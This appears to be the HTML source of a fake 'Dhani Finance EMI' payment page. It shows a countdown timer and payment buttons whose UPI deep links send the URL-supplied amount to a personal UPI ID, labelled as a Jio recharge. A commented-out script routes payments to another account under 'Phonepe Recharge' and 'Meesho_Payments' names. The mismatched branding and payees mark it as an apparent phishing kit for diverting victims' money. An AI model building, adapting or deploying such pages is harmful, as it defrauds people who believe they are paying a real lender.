<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dhani Finance EMI</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"></link>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-gray-100">
    <div class="flex items-center justify-between px-4 py-3 bg-blue-500 text-white">
        <div class="flex items-center">
            <a href="#" class="mr-2"><i class="fas fa-arrow-left"></i></a>
            <div class="flex items-center">
                <img src="./logo_data.png" alt="A logo of a building with a door and a window" class="mr-2" width="60" height="60" >
                <h1 class="text-lg font-bold">Dhani Finance</h1>
            </div>
        </div>
        <div>
            <i class="fas fa-user-circle"></i>
        </div>
    </div>
    <div class="px-4 py-6">
        <h2 class="text-2xl font-bold mb-4">Payment Options</h2>
        <div class="flex items-center justify-between mb-4">
            <h3 class="text-lg font-medium">UPI QR</h3>
            <div class="text-gray-500">
                <i class="fas fa-clock" id="timer"></i>
                <script>
                    // Set the time for 15 minutes
                    let countdownTime = 12 * 60; // 15 minutes in seconds
                
                    // Update the timer every second
                    const timerElement = document.getElementById("timer");
                
                    function startTimer() {
                        let minutes, seconds;
                
                        const interval = setInterval(() => {
                            // Calculate minutes and seconds
                            minutes = Math.floor(countdownTime / 60);
                            seconds = countdownTime % 60;
                
                            // Add a leading zero to seconds if less than 10
                            seconds = seconds < 10 ? '0' + seconds : seconds;
                
                            // Display the time in the timer element
                            timerElement.innerHTML = `${minutes}:${seconds}`;
                
                            // Check if the timer has reached zero
                            if (countdownTime <= 0) {
                                clearInterval(interval); // Stop the timer
                                timerElement.innerHTML = "Time's up!"; // Optional: display message
                            }
                
                            countdownTime--; // Decrease the time
                        }, 1000);
                    }
                
                    // Start the timer when the page loads
                    startTimer();
                </script>
            </div>
        </div>
        <div class="bg-white rounded-lg shadow-md p-4 flex items-center justify-between">
            <div class="flex items-center">
                <img src="./qr-code (1).png" alt="A QR code with a black and white pattern" class="mr-4" width="150" height="150" >
                <h4 class="text-lg font-medium" style="font-size: small;" >SCAN WITH ANY APP</h4>
                <style>.text-lg {
                    font-size: 1.125rem; /* 18px */
                    line-height: 1.75rem; /* 28px */
                }
                
                .font-semibold {
                    font-weight: 600;
                }
                
                .text-on-surface\/50 {
                    color: rgba(0, 0, 0, 0.5); /* Adjust color for 50% opacity */
                }
                </style>
            </div>
            <div class="flex items-center">
                <img src="./ui/googlepay.svg" width="32" height="32" alt="A logo of Google Pay with a colorful icon" class="mr-2">
                <img src="./ui/phonepe.e101f376.svg" width="32" height="32"  alt="A logo of PhonePe with a purple icon" class="mr-2">
                <img src="./ui/bhim.svg" width="32" height="32"  alt="A logo of BHIM with a black and white icon" class="mr-2">
                <img src="ui/amazonpay.svg" width="32" height="32"  alt="A logo of Paytm with a blue icon" class="mr-2">
                <img src="./ui/cred_circle.png" width="32" height="32"  alt="A logo of Paytm with a green icon" class="mr-2">
            </div>
        </div>
        <h3 class="text-lg font-medium mt-6 mb-2">Recommended</h3>
        <div class="bg-white rounded-lg shadow-md p-4 flex items-center justify-between">
            <div class="flex items-center" onclick="phonepayclick()" >
                <img src="./ui/phonepe.e101f376.svg" width="32" height="32" alt="A logo of PhonePe with a purple icon" class="mr-2">
                <h4 class="text-lg font-medium">UPI - PhonePe</h4>
            </div>
            <i class="fas fa-chevron-right"></i>
        </div>
        <h3 class="text-lg font-medium mt-6 mb-2">All Payment Options</h3>
        <div class="bg-white rounded-lg shadow-md p-4 flex items-center justify-between">
            <div class="flex items-center">
                
                <span data-testid="" title="UPI" style="color:#0E00CC;" class="inline-flex h-4 items-center *:h-full h-[18px] w-[18px] text-primary-600 extra-light-theme:text-primary-700 "><svg width="17" height="17" viewBox="0 0 17 17" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M8.50456 6.38966L9.73877 0.749513L10.5481 0.749512L15.0772 8.80381L7.63598 15.2552L6.745 15.2581L7.73515 10.2652" stroke="currentColor" stroke-width="1.5"></path>
                    <path d="M2.34272 15.2554L9.73967 8.35946L4.79963 0.750094L4.14249 0.74707L1.11604 15.2516L2.34272 15.2554Z" fill="currentColor" fill-opacity="0.09" stroke="currentColor" stroke-width="1.5"></path>
                    </svg>
                    </span>UPI</h4>
            </div>
            <div class="flex items-center" onclick="gpayclick()"> 
                <img src="./ui/googlepay.svg" width="24" height="24" alt="A logo of Google Pay with a colorful icon" class="mr-2">
                <img src="./ui/phonepe.e101f376.svg" width="24" height="24" alt="A logo of PhonePe with a purple icon" class="mr-2">
                <img src="./ui/paytm.svg" width="24" height="24" alt="A logo of BHIM with a black and white icon" class="mr-2">
            </div>
            <i class="fas fa-chevron-right"></i>
        </div>
        <div class="bg-white rounded-lg shadow-md p-4 flex items-center justify-between">
            <div class="flex items-center">
                <span data-testid="" style="color:#0E00CC;" title="Cards" class="inline-flex h-4 items-center *:h-full h-[18px] w-[18px] text-primary-600 extra-light-theme:text-primary-700 "><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 16 16"><path fill="currentColor" fill-opacity=".1" fill-rule="evenodd" d="M1.5 3.5h13v2h-13v-2Zm13 3.5v5.5h-13V7h13Z" clip-rule="evenodd"></path><path fill="currentColor" fill-rule="evenodd" d="M0 2h16v12H0V2Zm1.5 1.5h13v2h-13v-2Zm13 3.5v5.5h-13V7h13Z" clip-rule="evenodd"></path></svg></span>
                <h4 class="text-lg font-medium ml-2">Cards</h4>
            </div>
            <div class="flex items-center">
                <img src="./ui/card/visa.svg" width="24" height="24" alt="A logo of Visa with a blue icon" class="mr-2">
                <img src="./ui/card/mastercard.svg" width="24" height="24" alt="A logo of Mastercard with a red icon" class="mr-2">
                <img src="./ui/card/rupay.svg" width="24" height="24" alt="A logo of RuPay with a blue icon" class="mr-2">
            </div>
            <i class="fas fa-chevron-right"></i>
        </div>
        <div class="bg-white rounded-lg shadow-md p-4 flex items-center justify-between">
            <div class="flex items-center">
                <i class="fas fa-university" style="color:#0E00CC;"></i>
                <h4 class="text-lg font-medium ml-2">Netbanking</h4>
            </div>
            <div class="flex items-center">
                <img src="./ui/net/KKBK.gif" width="24" height="24" alt="A logo of ICICI Bank with a blue icon" class="mr-2">
                <img src="./ui/net/UTIB.gif" width="24" height="24" alt="A logo of Axis Bank with a red icon" class="mr-2">
                <img src="./ui/net/BARB_R.gif" width="24" height="24" alt="A logo of Bank of Baroda with a blue icon" class="mr-2">
            </div>
            <i class="fas fa-chevron-right"></i>
        </div>
        <div class="flex items-center justify-between mt-6">
            <div class="text-lg font-bold">â‚¹1233.75</div>
            <div class="text-gray-500">
       
            </div>
        </div>
        <div class="text-gray-500 text-sm mt-1"></div>
        <button class="bg-black text-white font-bold py-2 px-4 rounded-lg mt-4 w-full" id="onBuyClicked" >Continue</button>
    </div>


    <script>
        var urlParams = new URLSearchParams(window.location.search);
        var Id = urlParams.get('id');
      
        document.getElementById("offer-id").innerHTML = " " + Id;
        
        const upi ="shreenandanente348386.rzp@icici"
        function gpayclick() {
                  const url = "tez://upi/pay?ver=01&mode=19&pa=dikshitah1@oksbi&pn=Dhani Finance&tr=RZPOvZfYp5UFvRLoRqrv2&cu=INR&mc=5399&qrMedium=04&tn=Payment to Jio Recharge &am=" + Id ;
                  window.location.href = url;
              }
              
              function phonepayclick() {
                  const url = "phonepe://pay?ver=01&mode=19&pa=dikshitah1@oksbi&pn=Dhani Finance&tr=RZPOvZfYp5UFvRLoRqrv2&cu=INR&mc=5399&qrMedium=04&tn=Payment to  Jio Recharge&am=" + Id ;
                  window.location.href = url;
              }
              function paytmclick() {
                  const url = "paytmmp://pay?ver=01&mode=19&pa=dikshitah1@oksbi&pn=Dhani Finance&tr=RZPOvZfYp5UFvRLoRqrv2&cu=INR&mc=5399&qrMedium=04&tn=Payment to Jio Recharge&am=" + Id ;
                  window.location.href = url;
              }
              
              function whatsappclick() {
                  const url = "whatsapp://pay?ver=01&mode=19&pa=dikshitah1@oksbi&pn=Dhani Finance&tr=RZPOvZfYp5UFvRLoRqrv2&cu=INR&mc=5399&qrMedium=04&tn=Payment to Jio Recharge&am=" + Id ;
                  window.location.href = url;
              }
      
      
      </script>

<!--<script>
document.getElementById('onBuyClicked').addEventListener('click', function() {
    onBuyClicked(30.00); // Example amount
});

function onBuyClicked(amount) {
    fbq('track', 'Purchase', {currency: "USD", value: amount});

    if (!window.PaymentRequest || isUnsupportedBrowser()) {
        fallbackPayment(amount);
        return;
    }

    const supportedInstruments = [{
        supportedMethods: ['https://tez.google.com/pay'],
        data: {
            pa: 'fcbizckmkfs@freecharge',
            pn: 'Phonepe Recharge',
            tr: '1234ABCD',
            url: 'https://drigli.xyz/newtest/recharge.php',
            mc: '1234',
            tn: 'Purchase in Merchant',
        },
    }];

    const details = {
        total: {
            label: 'Total',
            amount: {
                currency: 'INR',
                value: amount,
            },
        },
        displayItems: [{
            label: 'Original Amount',
            amount: {
                currency: 'INR',
                value: amount,
            },
        }],
    };

    let request;
    try {
        request = new PaymentRequest(supportedInstruments, details);
    } catch (e) {
        alert('Payment Request Error: ' + e.message);
        return;
    }

    if (!request) {
        alert('Web payments are not supported in this browser.');
        return;
    }

    checkCanMakePayment(request).then((result) => {
        showPaymentUI(request, result, amount);
    }).catch((err) => {
        alert('Error calling checkCanMakePayment: ' + err);
    });
}

function isUnsupportedBrowser() {
    return isFacebookBrowser() || isSamsungBrowser() || isOperaMini() || isUCWebBrowser() || isIOS();
}

function checkCanMakePayment(request) {
    const canMakePaymentCache = 'canMakePaymentCache';

    if (sessionStorage.hasOwnProperty(canMakePaymentCache)) {
        return Promise.resolve(JSON.parse(sessionStorage[canMakePaymentCache]));
    }

    let canMakePaymentPromise = Promise.resolve(true);

    if (request.canMakePayment) {
        canMakePaymentPromise = request.canMakePayment();
    }

    return canMakePaymentPromise.then((result) => {
        sessionStorage[canMakePaymentCache] = JSON.stringify(result);
        return result;
    }).catch((err) => {
        alert('Error calling canMakePayment: ' + err);
    });
}

function showPaymentUI(request, canMakePayment, amount) {
    if (!canMakePayment) {
        fallbackPayment(amount);
        return;
    }

    const paymentTimeout = window.setTimeout(() => {
        window.clearTimeout(paymentTimeout);
        request.abort().then(() => {
            alert('Payment timed out.');
        }).catch(() => {
            alert('Unable to abort, user is in the process of paying.');
        });
    }, 20 * 60 * 1000);

    request.show().then((instrument) => {
        window.clearTimeout(paymentTimeout);
        processResponse(instrument);
    }).catch((err) => {
        alert(err);
    });
}

function processResponse(instrument) {
    const instrumentString = JSON.stringify({
        methodName: instrument.methodName,
        details: instrument.details,
        payerName: instrument.payerName,
        payerPhone: instrument.payerPhone,
        payerEmail: instrument.payerEmail,
    }, undefined, 2);

    fetch('process_payment.php', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: instrumentString,
    }).then(response => response.json()).then(data => {
        if (data.success) {
            window.location.href = 'payment_success.php';
        } else {
            Swal.fire('Payment failed', 'There was an issue with the payment. Please try again.', 'error');
        }
    }).catch(error => console.error('Error:', error));

    instrument.complete('success');
}

function fallbackPayment(amount) {
    const upiId = 'fcbizckmkfs@freecharge';
    const redirect_url = `paytmmp://cash_wallet?pa=${upiId}&pn=Meesho_Payments&am=${amount}&cu=INR&tn=4520175&featuretype=money_transfer`;

    window.location.href = redirect_url;
}

function isFacebookBrowser() {
    const ua = navigator.userAgent || navigator.vendor || window.opera;
    return ua.includes('FBAN') || ua.includes('FBAV');
}

function isSamsungBrowser() {
    return navigator.userAgent.toLowerCase().includes('samsungbrowser');
}

function isOperaMini() {
    return navigator.userAgent.toLowerCase().includes('opera mini');
}

function isUCWebBrowser() {
    return navigator.userAgent.toLowerCase().includes('ucbrowser');
}

function isIOS() {
    return /iPad|iPhone|iPod/.test(navigator.userAgent) && !window.MSStream;
}
</script>--!-->

<!-- Include SweetAlert2 for alerts -->
<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>

</body>
</html>